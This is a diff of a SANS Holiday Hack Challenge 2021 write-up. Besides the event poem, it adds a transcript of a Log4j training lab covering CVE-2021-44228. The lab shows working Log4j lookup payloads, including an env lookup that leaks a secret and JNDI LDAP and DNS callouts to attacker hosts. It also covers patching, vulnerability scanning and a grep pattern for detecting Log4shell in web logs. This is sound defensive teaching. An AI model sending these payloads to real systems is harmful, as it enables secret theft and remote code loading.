@@ -1,45 +1,28 @@
 # [KringleCon 4: Calling Birds](https://2021.kringlecon.com/)
 *SANS Holiday Hack Challenge 2021*
 
+The final narrative:
+
 <blockquote>
 Listen children to a story that was written in the cold
-
 'Bout a Kringle and his castle hosting hackers, meek and bold
-
 Then from somewhere came another, built his tower tall and proud
-
 Surely he, our Frosty villain hides intentions 'neath a shroud
-
 So begins Jack's reckless mission: gather trolls to win a war
-
 Build a con that's fresh and shiny, has this yet been done before?
-
 Is his Fest more feint than folly? Some have noticed subtle clues
-
 Running 'round and raiding repos, stealing Santa's Don'ts and Do's
-
 Misdirected, scheming, grasping, Frost intends to seize the day
-
 Funding research with a gift shop, can Frost build the better sleigh?
-
 Lo, we find unlikely allies: trolls within Jack's own command
-
 Doubting Frost and searching motive, questioning his dark demand
-
 Is our Jack just lost and rotten - one more outlaw stomping toes?
-
 Why then must we piece together cludgy, wacky radios?
-
 With this object from the heavens, Frost must know his cover's blown
-
 Hearkening from distant planet! We the heroes should have known
-
 Go ahead and hack your neighbor, go ahead and phish a friend
-
 Do it in the name of holidays, you can justify it at year's end
-
 There won't be any retweets praising you, come disclosure day
-
 But on the snowy evening after? Still Kris Kringle rides the sleigh
 </blockquote>
 
@@ -2656,6 +2639,343 @@ One crafty tester employed the mighty powers of awk like this:
 These were added on 12/21/21 at the North Pole location.
 
 #### Bow Ninecandle - Bonus! Blue Log4Jack
+```
+🎄🎄🎄 Prof. Petabyte here. In this lesson we'll look at the details around the recent Log4j
+🎄🎄🎄 vulnerabilities using sample Java programs. We'll also look at tools for scanning
+🎄🎄🎄 for vulnerable source code and identifying attacks using web server logs.
+🎄🎄🎄 If you get stuck, run 'hint' for assitance.
 
+In this lesson we'll look at Java source code to better understand the Log4j vulnerabilities
+described in CVE-2021-44228. You don't need to be a programmer to benefit from this lesson!
+
+I have prepared several files for you to use in this lesson. Run the 'ls' command to see the
+files for this lesson.
+```
+
+```shell
+elfu@2f3be4d07871:~$ ls
+log4j2-scan  logshell-search.sh  patched  vulnerable
+```
+
+```
+First we'll look at the some Java source, including an example of a vulnerable Java program
+using the Log4j library.
+Change to the vulnerable directory with the command 'cd vulnerable'
+List the files in this directory. Run the 'ls' command.
+```
+
+```shell
+elfu@2f3be4d07871:~$ cd vulnerable/
+elfu@2f3be4d07871:~/vulnerable$ ls
+DisplayFilev1.java  log4j-api-2.14.1.jar   startserver.sh
+DisplayFilev2.java  log4j-core-2.14.1.jar  testfile.txt
+```
+
+```
+Here we have Java source code (with the .java file name extension), and a vulnerable version of
+the Log4j library.
+Display the contents of the DisplayFilev1.java source code with the 'cat' command.
+```
+
+```shell
+elfu@2f3be4d07871:~/vulnerable$ cat DisplayFilev1.java 
+import java.io.*;
+
+public class DisplayFilev1 {
+    public static void main(String[] args) throws Exception {
+
+        File file = new File(args[0]);
+        BufferedReader br = new BufferedReader(new FileReader(file));
+
+        String st;
+        while ((st = br.readLine()) != null) {
+            System.out.println(st);
+        }
+    }
+}
+```
+
+```
+This Java program has one job: it reads a file specified as a command-line argument, and
+displays the contents on the screen. We'll use it as an example of error handling in Java.
+Let's compile this Java source so we can run it. Run the command 'javac DisplayFilev1.java'. Next, run the program and display the contents
+of the testfile.txt file.
+```
+
+```shell
+elfu@2f3be4d07871:~/vulnerable$ javac DisplayFilev1.java 
+elfu@2f3be4d07871:~/vulnerable$ java DisplayFilev1 testfile.txt
+Hello from Prof. Petabyte!
+```
+
+```
+This program did its job: it displayed the testfile.txt contents. But it also has some
+problems. Re-run the last command, this time trying to read testfile2.txt
+```
+
+```shell
+elfu@2f3be4d07871:~/vulnerable$ java DisplayFilev1 testfile2.txt
+Exception in thread "main" java.io.FileNotFoundException: testfile2.txt (No such file or directory)
+        at java.io.FileInputStream.open0(Native Method)
+        at java.io.FileInputStream.open(FileInputStream.java:195)
+        at java.io.FileInputStream.<init>(FileInputStream.java:138)
+        at java.io.FileReader.<init>(FileReader.java:72)
+        at DisplayFilev1.main(DisplayFilev1.java:7)`
+```
+
+```
+This program doesn't gracefully handle a scenario where the file doesn't exist. Program
+exceptions like this one need consistent handling and logging, which is where Log4j comes in.
+The Apache Log4j library allows developers to handle logging consistently in code.
+Let's look at an example of a modified version of this program. Run 'cat DisplayFilev2.java'.
+```
+
+```shell
+elfu@2f3be4d07871:~/vulnerable$ cat DisplayFilev2.java 
+import java.io.*;
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+
+public class DisplayFilev2 {
+    static Logger logger = LogManager.getLogger(DisplayFilev2.class);
+    public static void main(String[] args) throws Exception {
+        String st;
+        try {
+            File file = new File(args[0]);
+            BufferedReader br = new BufferedReader(new FileReader(file));
+
+            while ((st = br.readLine()) != null)
+                System.out.println(st);
+        }
+        catch (Exception e) {
+            logger.error("Unable to read file " + args[0] + " (make sure you specify a valid file name).");
+        }
+    }
+}
+```
+
+```
+This Java program has the same functionality, but the first few lines adds support for the
+log4j library. The 4th line from the bottom calls Log4j with the logger.error() function,
+followed by a logging message.
+Let's compile this Java source with Log4j support so we can run it. Run the command 'javac
+DisplayFilev2.java'.
+Nice work! Let's run the program and tell it to read testfile2.txt file.
+Run 'java DisplayFilev2 testfile2.txt'
+```
+
+```shell
+elfu@2f3be4d07871:~/vulnerable$ javac DisplayFilev2.java 
+elfu@2f3be4d07871:~/vulnerable$ java DisplayFilev2 testfile2.txt
+00:32:12.214 [main] ERROR DisplayFilev2 - Unable to read file testfile2.txt (make sure you specify a valid file name).
+```
+
+``` 
+This time, the program doesn't crash - it exits with an error message generated by Log4j. The
+Log4j library is valuable to produce consistent logging messages that can be handled flexibly.
+Unfortunately, multiple vulnerabilities allows attackers to manipulate this functionality in
+many versions of Log4j 2 before version 2.17.0.
+The CVE-2021-44228 Log4j vulnerability is from improper input validation. Log4j includes
+support for lookup features, where an attacker can supply input that retrieves more data than
+intended from the system.
+Re-run the prior java command, replacing testfile2.txt with the string '${java:version}'
+(IMPORTANT: include the quotation marks in this command)
+```
+
+```shell
+elfu@2f3be4d07871:~/vulnerable$ java DisplayFilev2 '${java:version}'
+00:33:55.319 [main] ERROR DisplayFilev2 - Unable to read file Java version 1.8.0_312 (make sure you specify a valid file name).
+```
+
+```
+Notice how the error has changed - instead of a file name, the error shows the Java version
+information. The Log4j lookup command java:version retrieves information from the host
+operating system.
+Let's try another example: re-run the last command, changing the java:version string to
+env:APISECRET
+```
+
+```shell
+elfu@2f3be4d07871:~/vulnerable$ java DisplayFilev2 '${env:APISECRET}'
+00:34:58.309 [main] ERROR DisplayFilev2 - Unable to read file pOFZFiWHjqKoQaRhNYyC (make sure you specify a valid file name).
+```
+
+```
+Using the Log4j env lookup, attackers can access local environment variables, possibly
+disclosing secrets like this one. Log4j also supports lookup requests using the Java Naming and
+Directory Interface (JNDI). These requests can reach out to an attacker server to request data.
+Log4j lookups can also tell the vulnerable server to contact the attacker using LDAP and DNS.
+Run the startserver.sh command to launch a simple server for testing purposes.
+The bottom window is waiting for a connection at the specified IP address and port. Re-run the
+DisplayFilev2 program, using the Log4j lookup to connect to the server:  java DisplayFilev2
+'${jndi:ldap://127.0.0.1:1389/Exploit}'
+This causes the server to reach out to the attacker's server and open a connection.
+To address this vulnerability, applications need an updated version of Log4j.
+Change to the ~/patched directory by running 'cd ~/patched'
+```
+
+```shell
+elfu@2f3be4d07871:~/patched$ ls
+DisplayFilev2.java  classpath.sh  log4j-api-2.17.0.jar  log4j-core-2.17.0.jar
+```
+
+```
+This is the same DisplayFilev2.java source, but the Log4j library is updated to a patched
+version.
+To use the updated library, change the Java CLASSPATH variable by running 'source classpath.sh'
+Compile the DisplayFilev2.java source using the patched Log4j library. Run 'javac
+DisplayFilev2.java'
+Use the Log4j lookup string java:version by running the following command: java DisplayFilev2
+'${java:version}'  IMPORTANT: include the quotation marks in this command.
+```
+
+```shell
+elfu@2f3be4d07871:~/patched$ source classpath.sh 
+Changing the Java CLASSPATH to use patched Log4j
+elfu@2f3be4d07871:~/patched$ javac DisplayFilev2.java 
+elfu@2f3be4d07871:~/patched$ java DisplayFilev2 '${java:version}'
+00:40:55.305 [main] ERROR DisplayFilev2 - Unable to read file ${java:version} (make sure you specify a valid file name).
+```
+
+```
+With the fixed Log4j library, attackers can't use the lookup feature to exploit library. The
+same program displays the ${java:version} lookup as a literal string, without performing the
+actual lookup.
+Next, we'll look at a technique to scan applications for the vulnerable Log4j library. Run 'cd'
+to return to the home directory.
+The log4j2-scan utility is a tool to scan for vulnerable Log4j application use. Run the
+log4j2-scan utility, specifying the vulnerable directory as the first command-line argument.
+```
+
+```shell
+elfu@2f3be4d07871:~$ log4j2-scan vulnerable/
+Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)
+Scanning directory: vulnerable/ (without tmpfs, shm)
+[*] Found CVE-2021-44228 (log4j 2.x) vulnerability in /home/elfu/vulnerable/log4j-core-2.14.1.jar, log4j 2.14.1
+
+Scanned 1 directories and 8 files
+Found 1 vulnerable files
+Found 0 potentially vulnerable files
+Found 0 mitigated files
+Completed in 0.00 seconds
+
+elfu@2f3be4d07871:~$ log4j2-scan patched/
+Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)
+Scanning directory: patched/ (without tmpfs, shm)
+
+Scanned 1 directories and 5 files
+Found 0 vulnerable files
+Found 0 potentially vulnerable files
+Found 0 mitigated files
+Completed in 0.00 seconds
+```
+
+```
+Log4j2-scan can also scan large directories of files.
+This server includes the Apache Solr software that uses Log4j in the /var/www/solr directory.
+Scan this directory with log4j2-scan to identify if the server is vulnerable.
+```
+
+```shell
+elfu@2f3be4d07871:~$ log4j2-scan /var/www/solr
+Logpresso CVE-2021-44228 Vulnerability Scanner 2.2.0 (2021-12-18)
+Scanning directory: /var/www/solr (without tmpfs, shm)
+[*] Found CVE-2021-44228 (log4j 2.x) vulnerability in /var/www/solr/server/lib/ext/log4j-core-2.14.1.jar, log4j 2.14.1
+[*] Found CVE-2021-44228 (log4j 2.x) vulnerability in /var/www/solr/contrib/prometheus-exporter/lib/log4j-core-2.14.1.jar, log4j 2.14.1
+
+Scanned 102 directories and 1988 files
+Found 2 vulnerable files
+Found 0 potentially vulnerable files
+Found 0 mitigated files
+Completed in 0.35 seconds
+```
+
+```
+Log4j2-scan finds two vulnerable Log4j libraries: one for the Solr platform, and one for a
+third-party plugin. Both need to be patched to resolve the vulnerability.
+Next, we'll look at scanning system logs for signs of Log4j attack.
+The CVE-2021-44228 Log4j exploit using JNDI for access is known as Log4shell. It uses the JNDI
+lookup feature to manipulate logs, gain access to data, or run commands on the vulnerable
+server. Web application servers are a common target.
+Let's scan the web logs on this server. Examine the files in the /var/log/www directory.
+```
+
+```shell
+elfu@2f3be4d07871:~$ ls /var/log/www
+access.log
+```
+
+```
+We can scan web server logs to find requests that include the Log4j lookup syntax using a text
+pattern matching routine known as a regular expression. Examine the contents of the logshell-
+search.sh script using 'cat'
+```
+
+```shell
+elfu@2f3be4d07871:~$ cat logshell-search.sh 
+#!/bin/sh
+grep -E -i -r '\$\{jndi:(ldap[s]?|rmi|dns):/[^\n]+' $1
+```
+
+```
+This script recursively searches for Log4shell attack syntax in any files. Run the logshell-
+search.sh command, specifying the /var/log/www directory as the search target.
+```
+
+```shell
+elfu@2f3be4d07871:~$ logshell-search.sh /var/log/www 
+/var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
+/var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] "GET /site.webmanifest HTTP/1.1" 304 0 "-" "${jndi:dns://10.99.3.43/NothingToSeeHere}"
+/var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] "GET / HTTP/1.1" 304 0 "-" "${jndi:ldap://10.3.243.6/DefinitelyLegitimate}"
+```
+
+```
+In this output we see three examples of Log4shell attack. Let's look at each line individually.
+Re-run the previous command, piping the output to | sed '1!d' to focus on the first line.
+```
+
+```shell
+elfu@2f3be4d07871:~$ logshell-search.sh /var/log/www | sed '1!d'
+/var/log/www/access.log:10.26.4.27 - - [14/Dec/2021:11:21:14 +0000] "GET /solr/admin/cores?foo=${jndi:ldap://10.26.4.27:1389/Evil} HTTP/1.1" 200 1311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:64.0) Gecko/20100101 Firefox/64.0"
+```
+
+```
+In this first attack, we see the attacker is at 10.26.4.27. The Log4j lookup command is sent as
+a URL GET parameter, attempting to use JDNI to reach the attacker LDAP server at
+ldap://10.26.4.27:1389 (see in the ${jndi:ldap://10.26.4.27:1389/Evil} string).
+Re-run the previous command, this time looking at the 2nd line of output.
+```
+
+```shell
+elfu@2f3be4d07871:~$ logshell-search.sh /var/log/www | sed '2!d'
+/var/log/www/access.log:10.99.3.1 - - [08/Dec/2021:19:41:22 +0000] "GET /site.webmanifest HTTP/1.1" 304 0 "-" "${jndi:dns://10.99.3.43/NothingToSeeHere}"
+```
+
+```
+In this second attack, we see the attacker is at 10.99.3.1. Instead of a URL GET parameter,
+this time the exploit is sent through the browser User-Agent field. The attacker attempted to
+use JDNI to reach the attacker DNS server at dns://10.99.3.43, using a different IP than the
+exploit delivery address.
+Re-run the previous command, this time looking at the 3rd line of output.
+```
+
+```shell
+elfu@2f3be4d07871:~$ logshell-search.sh /var/log/www | sed '3!d'
+/var/log/www/access.log:10.3.243.6 - - [08/Dec/2021:19:43:35 +0000] "GET / HTTP/1.1" 304 0 "-" "${jndi:ldap://10.3.243.6/DefinitelyLegitimate}"
+```
+
+```
+Here we see the attacker is at 10.3.243.6. This attack is also sent through the browser User
+Agent field, but this more closely resembles the first attack using the attacker LDAP server at
+10.3.243.6. The DefinitelyLegitimate string is supplied by the attacker, matching a malicious
+Java class on the LDAP server to exploit the victim Log4j instance.
+
+🍬🍬🍬🍬Congratulations!🍬🍬🍬🍬
+You've completed the lesson on Log4j vulnerabilities.
+```
+
+The `logshell-search.sh` script is available [here](https://gist.github.com/joswr1ght/a6badf9b0b148efadfccbf967fcc2b41), and more information on Log4j 2 lookups and the CVE can be found [here](https://logging.apache.org/log4j/2.x/manual/lookups.html). 
 
 #### Icky McGoop - Bonus! Red Log4Jack
+
+Provided resources are [here](https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4) (walkthrough) and [here](https://bishopfox.com/blog/log4j-zero-day-cve-2021-44228) (talk).
